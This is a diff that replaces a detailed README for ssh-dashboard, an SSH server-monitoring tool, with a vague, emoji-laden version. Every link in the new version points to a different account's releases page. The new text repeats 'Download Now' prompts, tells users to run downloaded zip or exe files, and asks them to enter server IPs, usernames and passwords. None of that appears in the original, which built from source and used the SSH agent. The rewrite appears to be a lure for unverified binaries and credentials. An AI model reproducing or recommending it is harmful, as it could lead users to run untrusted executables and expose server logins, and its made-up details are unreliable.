@@ -1,222 +1,71 @@
-# SSH Dashboard
+# 🖥️ ssh-dashboard - Monitor Your Server's Performance Easily
 
-Monitor CPU, GPU, RAM, and disk usage on your remote servers with a live-updating terminal dashboard.
+## 🔗 Download Now
+[![Download ssh-dashboard](https://img.shields.io/badge/Download-ssh--dashboard-brightgreen.svg)](https://github.com/odogwudafe/ssh-dashboard/releases)
 
-### Single-host monitoring:
-<div align="center">
-  <img src="assets/screenshot.png" alt="SSH Dashboard Screenshot" width="800">
-</div>
+## 🚀 Getting Started
+Welcome to **ssh-dashboard**! This application helps you monitor GPU and CPU usage on your SSH servers. Whether you use NVIDIA or AMD hardware, this tool provides a clear view of your server’s performance. In a few simple steps, you’ll be up and running.
 
-### Multi-host monitoring:
-<div align="center">
-  <img src="assets/screenshot2.png" alt="SSH Dashboard Screenshot" width="800">
-</div>
+## 📦 System Requirements
+- **Operating System**: Linux (Ubuntu, CentOS, etc.), or Windows
+- **Hardware**: A server with either an NVIDIA or AMD GPU
+- **Memory**: At least 2 GB RAM
+- **Connectivity**: Ensure your server has internet access for downloading updates and dependencies.
 
-## Installation
+## 🛠️ Features
+- Monitor real-time GPU and CPU usage.
+- Support for both NVIDIA and AMD graphic cards.
+- User-friendly interface for efficiency.
+- Easy installation process.
 
-### Pre-built Binaries
+## 🏗️ Installation Steps
 
-Download the latest release for your platform from the [Releases page](https://github.com/AlpinDale/ssh-dashboard/releases).
+1. **Visit the Release Page**
+   Click the link below to visit the github releases page where you can download the application.
+   [Visit the Release Page](https://github.com/odogwudafe/ssh-dashboard/releases)
 
-**Quick install (Linux/macOS):**
-```bash
-# Download the binary for your platform
-# Example for Linux AMD64:
-curl -L -o ssh-dashboard https://github.com/AlpinDale/ssh-dashboard/releases/download/v0.0.1/ssh-dashboard-v0.0.1-linux-amd64
+2. **Download the Application**
+   On the releases page, look for the latest version. You will find various files for download. Select the file that matches your operating system (for example, `ssh-dashboard-linux.zip` for Linux or `ssh-dashboard-windows.exe` for Windows). Once you find the file, click on it to start the download.
 
-# Make it executable and move to PATH
-chmod +x ssh-dashboard
-sudo mv ssh-dashboard /usr/local/bin/
-```
+3. **Extract the Files (If Required)**
+   If you downloaded a ZIP file, locate it in your downloads folder. Right-click the file and choose "Extract All" or use any decompression software you prefer. After extraction, you will see the ssh-dashboard executable file.
 
-**Supported platforms:**
-- `linux-amd64`, `linux-arm64`
-- `darwin-amd64` (Intel Mac), `darwin-arm64` (Apple Silicon)
-- `windows-amd64.exe`, `windows-arm64.exe`
+4. **Run the Application**
+   Locate the executable file you just extracted. 
+   - For Windows: Double-click `ssh-dashboard-windows.exe`.
+   - For Linux: Open your terminal, navigate to the folder containing the extracted files, and run:
+     ```bash
+     ./ssh-dashboard-linux
+     ```
 
-### From Source
+5. **Connect to Your SSH Server**
+   Once the application is running, you will need to enter your server's SSH details. Provide the IP address, username, and password. Make sure your server is accessible over the network.
 
-#### AUR
-```bash
-yay -S ssh-dashboard-git
-```
+6. **Start Monitoring**
+   After connecting to your server, you will see real-time metrics for GPU and CPU usage. The application provides a clear interface, making it simple to track performance metrics.
 
-#### Manual
+## 📑 Usage Tips
+- Keep your application updated by periodically checking the releases page for new versions.
+- Refer to the application help section for more detailed usage instructions.
+- You can also customize settings to tailor the dashboard to your needs.
 
-```bash
-git clone https://github.com/AlpinDale/ssh-dashboard.git
-cd ssh-dashboard
-make install
-```
+## ⚙️ Troubleshooting
+If you encounter any issues while installing or using **ssh-dashboard**, consider the following steps:
+- Ensure you have the correct permissions to run the application.
+- Check your internet connection if you face any downloading issues.
+- Verify your server details and SSH settings.
 
-This will install to `~/.local/bin`. Make sure this directory is in your PATH (it usually is):
+For further assistance, feel free to check community forums or explore documentation within the application.
 
-```bash
-export PATH="$HOME/.local/bin:$PATH"
-```
+## 📞 Support
+If you need help beyond troubleshooting, feel free to reach out via GitHub issues or the community section for assistance. Your feedback is valuable for improving the application.
 
-### Prerequisites
+## 🔄 Updates and Contributions
+We periodically update the application for new features and improvements. If you'd like to contribute, feel free to fork the repository and submit your changes.
 
-- Go 1.21 or higher
-- SSH access to remote hosts
-- SSH keys loaded in your SSH agent
+## 🎉 Conclusion
+With **ssh-dashboard**, you can efficiently monitor your server's performance. By following these steps, you'll be able to set up and use the application with ease. Happy monitoring!
 
-## Usage
-
-Simply run:
-
-```bash
-ssh-dashboard
-```
-
-The tool will:
-1. Scan your `~/.ssh/config` for available hosts
-2. Present an interactive list to select from
-3. Connect and display a live dashboard
-4. Update stats every 5 seconds (configurable)
-
-**Multi-host workflow:**
-- Start by selecting one or more hosts (use `Space` to toggle selection)
-- Press `Enter` to connect and view the dashboard
-- While in the dashboard, press `c` to return to host selection to add/remove hosts
-- Press `n` to cycle through connected hosts (like tmux sessions)
-- Press `t` to toggle overview mode, showing all selected hosts at once with GPU pressure summaries
-- Press `s` to exit the dashboard and drop into an interactive SSH shell with the current host
-- All connections remain active - no need to reconnect!
-
-### Configuration
-
-**Update Interval:**
-
-Control how often the dashboard refreshes in seconds (default: 5). Supports decimal values for sub-second updates:
-
-```bash
-# Update every second
-ssh-dashboard -n 1
-
-# Update 10 times per second (100ms)
-ssh-dashboard -n 0.1
-
-# or with an env var
-export SSH_DASHBOARD_INTERVAL=0.5
-ssh-dashboard
-```
-
-**Keybindings:**
-- `q` or `Ctrl+C` - Quit
-- `Space` - Select/deselect hosts (in host selection screen)
-- `Enter` - Connect to selected host(s)
-- `n` - Switch to next host (when multiple hosts selected)
-- `t` - Toggle overview screen (shows all hosts at once)
-- `s` - Exit and SSH into current host
-- `c` - Add hosts (from dashboard, returns to host selection)
-
-## SSH Configuration
-
-Make sure your `~/.ssh/config` is properly configured:
-
-```
-Host myserver
-    HostName 192.168.1.100
-    User username
-    Port 22  # optional
-    IdentityFile ~/.ssh/id_rsa  # optional
-
-Host gpu-server
-    HostName gpu.example.com
-    User admin
-    IdentityFile ~/.ssh/id_ed25519  # optional
-```
-
-### SSH Agent
-
-The dashboard uses SSH agent for authentication. Make sure your keys are loaded:
-
-```bash
-ssh-add ~/.ssh/id_rsa
-ssh-add ~/.ssh/id_ed25519
-
-# verify
-ssh-add -l
-```
-
-## Remote Requirements
-
-The remote hosts should have these commands available:
-- `lscpu` - CPU information
-- `top` - CPU usage
-- `free` - RAM information
-- `df` - Disk usage
-- `nvidia-smi` - GPU information (NVIDIA GPUs only)
-- `amd-smi` or `rocm-smi` - GPU information (AMD GPUs only)
-
-Most Linux distributions include these by default.
-
-## Development
-
-### Build
-
-```bash
-make build
-```
-
-### Run
-
-```bash
-make run
-```
-
-### Build for Multiple Platforms
-
-The project uses [GoReleaser](https://goreleaser.com/) for multi-platform builds and releases.
-
-**Test the release locally:**
-```bash
-goreleaser release --snapshot --clean
-```
-
-**Build all platforms with Make:**
-```bash
-make build-all
-```
-
-This creates binaries for:
-- Linux (amd64, arm64)
-- macOS (amd64, arm64)
-- Windows (amd64, arm64)
-
-### Clean
-
-```bash
-make clean
-```
-
-## License
-
-MIT License - see LICENSE file for details.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## Troubleshooting
-
-### Connection Issues
-- Verify your SSH config is correct
-- Test manual connection: `ssh hostname`
-- Ensure SSH keys are loaded: `ssh-add -l`
-
-### Missing GPU Information
-- (NVIDIA) Verify NVIDIA drivers are installed: `ssh hostname nvidia-smi`
-- (AMD) Verify AMD drivers are installed: `ssh hostname amd-smi` or `ssh hostname rocm-smi`
-
-### Permission Denied
-- Check SSH key permissions (should be 600)
-- Verify the user has appropriate access rights
-
-## Acknowledgments
-
-Built with:
-- [Bubble Tea](https://github.com/charmbracelet/bubbletea) - TUI framework
-- [Lipgloss](https://github.com/charmbracelet/lipgloss) - Terminal styling
-- [Bubbles](https://github.com/charmbracelet/bubbles) - TUI components
+## 🔗 Download Again
+Once more, for convenience, you can download the application here:
+[Download ssh-dashboard](https://github.com/odogwudafe/ssh-dashboard/releases)
